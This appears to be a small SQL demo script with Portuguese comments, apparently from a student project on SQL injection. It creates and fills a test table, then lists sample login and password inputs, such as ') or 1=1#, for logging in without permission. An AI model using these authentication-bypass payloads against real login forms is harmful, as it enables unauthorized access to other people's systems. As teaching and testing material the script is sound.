------TABELA TESTE INJECTION----
DROP TABLE teste;
CREATE TABLE teste (
	id			INT 		NOT NULL auto_increment,
	nome			VARCHAR(10) NOT NULL,
    PRIMARY KEY (id)
);

INSERT INTO teste VALUES(1, 'um');
INSERT INTO teste VALUES(2, 'dois');
INSERT INTO teste VALUES(3, 'tres');
INSERT INTO teste VALUES(4, 'quatro');


-----INJETAR NOS CAMPOS    injection ----------
--EXEMPLO 1: logando sem permissao--
login: tcc
senha: ') or 1=1#

login: ') or 1=1
senha: tcc

